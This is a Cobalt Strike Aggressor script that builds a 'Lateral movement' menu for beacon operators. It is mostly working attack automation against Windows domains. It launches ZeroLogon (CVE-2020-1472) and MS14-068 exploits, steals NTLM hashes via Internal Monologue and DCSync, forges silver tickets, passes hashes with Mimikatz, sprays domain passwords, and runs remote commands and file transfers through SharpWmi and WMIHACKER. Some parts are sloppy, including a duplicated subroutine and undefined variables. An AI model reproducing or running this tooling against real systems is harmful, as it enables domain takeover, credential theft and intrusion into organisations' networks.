menu "Lateral movement" {

    menu "IPC Connections" {
        item "View the shares opened on this machine" {
            blog($1, "\c9========== View open shares ==========");
            bshell($1, "net share");
        }
        item "View the shares opened on the specified host" {
            blog($1, "\c9========== Close the specified share ==========");
            prompt_text("Target host IP?", "", lambda({ bshell(@ids, "net view \\\\$1"); }, @ids => $1));
        }
        item "View connection (local connection to other machines)" {
            blog($1, "\c9========== View connection (local connection to other machines) ==========");
            bshell($1, "net use");
		}
		item "Check the connection (other machines connect to this machine))" {
			blog($1, "\c9========== Check the connection (other machines connect to this machine)) ==========");
			bshell($1, "net session");
		}
        item "Establish an IPC connection with the specified host" {
            blog($1, "\c9========== Establish an IPC connection with the specified host ==========");
            $bid = $1['@'];
            $dialog = dialog("Establish an IPC connection with the specified host", %(bid => $bid), &net_ipc);
            dialog_description($dialog, "This function establishes an IPC connection with the specified host");
            drow_text($dialog, "ip", "Target HostIP:  ");
            drow_text($dialog, "username", "User Name:  ");
            drow_text($dialog, "password", "Password.  ");
            dbutton_action($dialog, "Determine");
            dialog_show($dialog);
        }
        sub net_ipc {
            bshell($bid, "net use \\\\$3['ip'] /u:$3['username'] $3['password']");
        }
        item "Delete the IPC connection established with the specified host" {
            blog($1, "\c9========== Delete the IPC connection established with the target ip ==========");
            prompt_text("Target host IP?", "", lambda({ bshell(@ids, "net use \\\\$1 /del");  }, @ids => $1));
        }
    }    
    item "NTLM hash"{
        local('$bid');
            foreach $bid ($1){
                internal_monologue($bid);
        }
    }
    sub internal_monologue{
        $binary = script_resource("/scripts/LateMovement/InternalMonologue.exe");
        $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
        beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
        if(!-exists $binary)
        {
            berror($1, "InternalMonologue binary cannot be found at $binary");
            return;
        }
        $args = "-Downgrade True -Verbose True";
        bexecute_assembly($1, $binary, $args);
    }	
	item "ZeroLogonBOF" {
		blog($1, "\c9=========== ZeroLogonBOF ==========");
        $dialog = dialog("ZeroLogon", %( bid => $1["@"] , Domain => "xstark.sec" , NetBios => "DCX" , arch => "x64") ,&ZeroLogon);
        dialog_description($dialog,"ZeroLogon（CVE-2020-1472）The attack may cause the host to go off domain! Reference：https://github.com/rsmudge/ZeroLogon-BOF");
        drow_text($dialog,"Domain","Domain Name:");
        drow_text($dialog,"NetBios","domain control NetBios:");
        drow_combobox($dialog,"arch","Arch:",@("x64","x86"));
        dbutton_action($dialog,"Exploit");
        dialog_show($dialog);
	}
    sub ZeroLogon{
        $arch = $3["arch"];
        $bid = $3["bid"];
        $fqdn = $3["NetBios"] . "." . $3["Domain"];
        #read in the right BOF file
        $handle = openf(script_resource("/scripts/LateMovement/ZeroLogon/zerologon. $+ $arch $+ .o"));
        $data = readb($handle,-1);
        closef($handle);
        # build our arguments
        $args = bof_pack($bid,"ZZZ",$fqdn,$3["NetBios"],$3["NetBios"] . '$');
        btask($bid, "Reset $netbios $+ \$ machine account via CVE-2020-1472");
        # execute it.
        beacon_inline_execute($bid, $data, "go", $args);
    }	
            
    item "SharpHound3.0" {
		blog($1, "\c9=========== SharpHound3.0 ==========");
        bexecute_assembly($1, script_resource("/scripts/LateMovement/SharpHound.exe"), "");
    }


    item "Mimikatz-pth"{
        local('$bid');
        foreach $bid ($1){
            mimikatz_passthehash($bid);
        }
    }


    sub mimikatz_passthehash{
        $bid = $1;
        $dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "XSTARK" , user => "administrator" , hash => "hash") , 
        lambda({
            bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
        }
        )
        );
        dialog_description($dialog, "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.");
        drow_text($dialog, "beacon",  "Beacon:");
        drow_text($dialog, "domain",  "Domain:");
        drow_text($dialog, "user",  "User:");
        drow_text($dialog, "hash",  "Hash:");
        dbutton_action($dialog, "Launch");
        dialog_show($dialog);
    }



    menu "SharpWmi" {
        item "Upload SharpWmi" {
			blog($1, "\c9=========== Upload SharpWmi ==========");
            $bid = $1;
            $dialog = dialog("Upload sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
            drow_text($dialog, "UploadPath",  "Upload path: "); 	
            dbutton_action($dialog, "Upload");
            dialog_show($dialog);
    }
    sub sharpwmi_up {

        bcd($bid, $3['UploadPath']);
            bupload($bid, script_resource("/scripts/LateMovement/sharpwmi.exe"));
        

    }
    item "Run SharpWmi" {
		blog($1, "\c9=========== Run SharpWmi ==========");
        $bid = $1['@'];
        $Dialog = dialog("Run sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
        dialog_description($Dialog, "This is a tool based on port 135 for lateral movement, with the function of executing commands and uploading files, executing commands through wmi and data transfer through calls, currently it only supports uploading files below 512kb, because the length of resetting each value cannot exceed 512kb.");
        drow_text($Dialog, "ip", "ip: ");
        drow_text($Dialog, "username", "username: ");
        drow_text($Dialog, "password", "password: ");
        drow_text($Dialog, "type", "cmd/upload: ");
        drow_text($Dialog, "cmd/path", "cmd/path: ");
        dbutton_action($Dialog, "Run");
        dialog_show($Dialog);
    }

    sub sharpwmi_run{
        local('$Name $username $password $type $cmd/path');
        $Name = $3['ip'];
        $username = $3['username'];
        $password = $3['password'];
        $type = $3['type'];
        $cmd/path = $3['cmd/path'];
        bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
    } 
    item "Delete SharpWmi" {
		blog($1, "\c9=========== Delete SharpWmi ==========");
        local('$bid');
        foreach $bid ($1){
            bshell($1, "del /f /s /q sharpwmi.exe");
        }
    }
    }

    menu "Pass The Ticket" {
        item "MS14-068 (KB3011780)" {
			blog($1, "\c9=========== Ms14-068 (KB3011780) ==========");
            show_message("Using this method will clear the local credentials!!!");
            $dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "xstark.sec" , user => "administrator" , password => "Admin2012" , user_sid => "Domain User SID" , DC_name => "domain control") , &Ms14_068);
            dialog_descrption($dialog,"Microsoft PAC inspection is not strict enough to cause the vulnerability");
            drow_text($dialog,"Domain","Domain Name:");
            drow_text($dialog,"user","User:");
            drow_text($dialog,"password","Password:");
            drow_text($dialog,"user_sid","User SID:");
            drow_text($dialog,"DC_name","Domain Control Name:");
            dbutton_action($dialog,"Exploit");
            dialog_show($dialog);   
        }

        item "Silver-ticket" {
			blog($1, "\c9=========== Silver-ticket ==========");
            $dialog = dialog("DomainInfo", %( bid => $1["@"] , Domain => "xstark.sec" , Domain_sid => "xxx" , Target_name => "WIN-Q1E9PO4969I" , target_hash => "xxx" , user => "administrator" , server => "LDAP" ) ,&Silver_DCSync);
            dialog_description($dialog,"Using a silver ticket to gain access to a service");
            drow_text($dialog,"Domain","Domain Name:");
            drow_text($dialog,"Domain_sid","Domain SID:");
            drow_text($dialog,"Target_name","Target machine name:");
            drow_text($dialog,"target_hash","Target machine Hash:");
            drow_text($dialog,"user","User:");
            drow_combobox($dialog,"server","Services:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
            dbutton_action($dialog,"Exploit");
            dialog_show($dialog);

        }

        item "Import_ticket" {
			blog($1, "\c9=========== Import_ticket ==========");
            $dialog = dialog("Import the ticket file in this session", %( bid => $1["@"] , file => "") ,lambda({
                bkerberos_ticket_use($3["bid"],$3["file"])
            }));
            dialog_description($dialog,"Importing ticket files");
            drow_file($dialog,"file","Note Documents:");
            dbutton_action($dialog,"Exploit");
            dialog_show($dialog);
        }
    }

    menu "WMIHACKER" {
        item "Upload WMIHACKER" {
			blog($1, "\c9=========== Upload WMIHACKER ==========");
            $bid = $1;
            $dialog = dialog("Upload WMIHACKER", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &WMIHACKER);
            drow_text($dialog, "UploadPath",  "Upload path: "); 	
            dbutton_action($dialog, "Upload");
            dialog_show($dialog);
    }
    sub WMIHACKER {
        bcd($bid, $3['UploadPath']);
            bupload($bid, script_resource("/scripts/LateMovement/WMIHACKER.vbs"));
    }
    item "cmd" {
		blog($1, "\c9=========== cmd ==========");
        $bid = $1['@'];
        $Dialog = dialog("WMIHACKER_cmd",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
        dialog_description($Dialog, "");
        drow_text($Dialog, "host", "host: ");
        drow_text($Dialog, "user", "user: ");
        drow_text($Dialog, "pass", "pass: ");
        drow_text($Dialog, "command", "command: ");
        drow_text($Dialog, "GETRES", "GETRES: ");
        dbutton_action($Dialog, "Run");
        dialog_show($Dialog);
    }
    sub WMIHACKER_cmd {
        local('$host $user $pass $command $GETRES');
        $host = $3['host'];
        $user = $3['user'];
        $pass = $3['pass'];
        $command = $3['command'];
        $GETRES = $3['GETRES'];
        bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
    } 

    item "shell" {
		blog($1, "\c9=========== shell ==========");
        $bid = $1['@'];
        $Dialog = dialog("WMIHACKER_shell",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
        dialog_description($Dialog, "");
        drow_text($Dialog, "host", "host: ");
        drow_text($Dialog, "user", "user: ");
        drow_text($Dialog, "pass", "pass: ");
        drow_text($Dialog, "command", "command: ");
        drow_text($Dialog, "GETRES", "GETRES: ");
        dbutton_action($Dialog, "Run");
        dialog_show($Dialog);
    }
    sub WMIHACKER_cmd {
        local('$host $user $pass $command $GETRES');
        $host = $3['host'];
        $user = $3['user'];
        $pass = $3['pass'];
        $command = $3['command'];
        $GETRES = $3['GETRES'];
        bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
    }

    item "upload" {
		blog($1, "\c9=========== upload ==========");
        $bid = $1['@'];
        $Dialog = dialog("WMIHACKER_upload",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\windows\\system32\\calc.exe", remotepath => "C:\\\$Recycle.Bin",bid => $bid),&WMIHACKER_upload);
        dialog_description($Dialog, "");
        drow_text($Dialog, "host", "host: ");
        drow_text($Dialog, "user", "user: ");
        drow_text($Dialog, "pass", "pass: ");
        drow_text($Dialog, "localpath", "localpath: ");
        drow_text($Dialog, "remotepath", "remotepath: ");
        dbutton_action($Dialog, "Run");
        dialog_show($Dialog);
    }
    sub WMIHACKER_upload{
        local('$host $user $pass $localpath $remotepath');
        $host = $3['host'];
        $user = $3['user'];
        $pass = $3['pass'];
        $localpath = $3['localpath'];
        $remotepath = $3['remotepath'];
        bshell($bid, "cscript WMIHACKER.vbs /upload  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$localpath\"  $+ \"$remotepath\"");
    } 

    item "download" {
		blog($1, "\c9=========== download ==========");
        $bid = $1['@'];
        $Dialog = dialog("WMIHACKER_download",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\calc", remotepath => "c:\\windows\\system32\\calc.exe",bid => $bid),&WMIHACKER_download);
        dialog_description($Dialog, "");
        drow_text($Dialog, "host", "host: ");
        drow_text($Dialog, "user", "user: ");
        drow_text($Dialog, "pass", "pass: ");
        drow_text($Dialog, "localpath", "localpath: ");
        drow_text($Dialog, "remotepath", "remotepath: ");
        dbutton_action($Dialog, "Run");
        dialog_show($Dialog);
    }
    sub WMIHACKER_download {
        local('$host $user $pass $localpath $remotepath');
        $host = $3['host'];
        $user = $3['user'];
        $pass = $3['pass'];
        $localpath = $3['localpath'];
        $remotepath = $3['remotepath'];
        bshell($bid, "cscript WMIHACKER.vbs /download  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$localpath\"  $+ \"$remotepath\"");
    } 



    }

    item "Enumerate domain user passwords" {
		blog($1, "\c9=========== Enumerate domain user passwords ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
        dialog_description($dialog, "Enumerate user passwords in the domain (Pass2User specifies individual password-enumeration, User2Pass specifies individual user-blasting).");
        drow_text($dialog, "content", "content:  ");		
        drow_combobox($dialog, "type", "type", @("-User2Pass", "-Pass2User"));
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
    }
    sub SharpDomainSpray {
        $arg = join(' ', @($3['type'],$3['content']));
        bexecute_assembly($bid, script_resource("/scripts/LateMovement/SharpDomainSpray.exe"), $arg);
    } 

    item "Get SPN" {
		blog($1, "\c9=========== Get SPN ==========");
        bexecute_assembly($1, script_resource("/scripts/LateMovement/SPNSearcher.exe"), "");
    }

    menu "Get Domain Users hash" {
        item "Designated User" {
		    blog($1, "\c9=========== Designated User ==========");
            $dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "Domain Name" , user => "User") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
            dialog_description($dialog,"Use Mimikatz to get the password hash of a given user");
            drow_text($dialog,"bid","Bid:");
            drow_text($dialog,"domain","Domain:");
            drow_text($dialog,"user","User:");
            dbutton_action($dialog,"Exploit");
            dialog_show($dialog);
        }
        item "All Users" {
			blog($1, "\c9=========== All Users ==========");
            $dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "Domain Name") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
            dialog_description($dialog, "Get the password hash of all users");
            drow_text($dialog, "domain","Domain:");
            dbutton_action($dialog,"Exploit");
            dialog_show($dialog);
        }
    }

    item "Get Domain Shares" {
		blog($1, "\c9=========== Get Domain Shares ==========");
        $bid = $1['@'];
        $dialog = dialog("Get Domain Shares", %(bid => $bid), &SharpShares);
        dialog_description($dialog, "List the network share information of all computers in the current domain, and also convert all computer names to IP addresses.");
        drow_combobox($dialog, "type", "type:", @("ips","shares"));		
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
    }
    sub SharpShares {
        $arg = join(' ',  @($3['type']));
        bexecute_assembly($bid, script_resource("/scripts/LateMovement/SharpShares.exe"), $arg);
    }
            
            
}

sub pth_injection_Ticket {
    if ( -is64 $3["bid"] )
    {
        bupload($3["bid"], script_resource("/scripts/LateMovement/kekeo/x64/kekeo.exe"));
    }
    else
    {
        bupload($3["bid"], script_resource("/scripts/LateMovement/kekeo/Win32/kekeo.exe"));
    }
    $payload = "kekeo.exe \"tgt::ask /user:" . $3["user"] . " /domain:" . $3["Domain"] . " /ntlm:" . $3["Hash"] . "\" \"exit\"";
    $file_name = "TGT_" . $3["user"] . "@" . $3["Domain"] . "_krbtgt~" . $3["Domain"] . "@" . $3["Domain"] . ".kirbi";
    bshell($3["bid"],$payload)
    bshell($3["bid"],"kekeo.exe \"kerberos::ptt " . $file_name . "\" \"exit\"");
}

sub Ms14_068 {
    bupload($3["bid"],script_resource("/scripts/LateMovement/MS14-068.exe"));
    $payload = "ms14-068.exe -u " . $3["user"] . "@" . $3["Domain"] . " -s " . $3["user_sid"] . " -d " . $3["DC_name"] . "." . $3["Domain"] . " -p " . $3["password"];
    bmimikatz($3["bid"],"kerberos::purge");
    bshell($3["bid"],$payload);
    bmimikatz($3["bid"],"kerberos::ptc TGT_" . $3["user"] . "@" . $3["Domain"] . ".ccache");
    bshell($3["bid"],"dir \\\\" . $3["DC_name"] . "\\C$");
}


sub Silver_DCSync {
    $payload = "kerberos::golden /domain:" . $3["Domain"] . " /sid:" . $3["Domain_sid"] . " /target:" . $3["Target_name"] . "." . $3["Domain"] . " /rc4:" . $3["target_hash"] . " /service:" . $3["server"] . " /user:" . $3["user"] . " /ptt";
    bmimikatz($3["bid"],$payload);
} 
